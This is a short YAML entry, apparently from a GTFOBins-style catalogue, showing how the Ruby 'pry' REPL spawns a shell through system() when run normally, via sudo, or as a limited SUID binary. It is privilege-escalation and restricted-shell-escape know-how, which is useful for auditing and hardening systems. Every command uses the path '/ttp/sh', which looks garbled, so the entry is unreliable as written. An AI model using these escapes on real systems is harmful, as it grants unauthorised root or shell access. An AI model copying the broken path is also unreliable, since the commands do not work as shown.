---
functions:
  shell:
    - code: |
        pry
        system("/ttp/sh")
  sudo:
    - code: |
        sudo pry
        system("/ttp/sh")
  limited-suid:
    - code: |
        ./pry
        system("/ttp/sh")
---
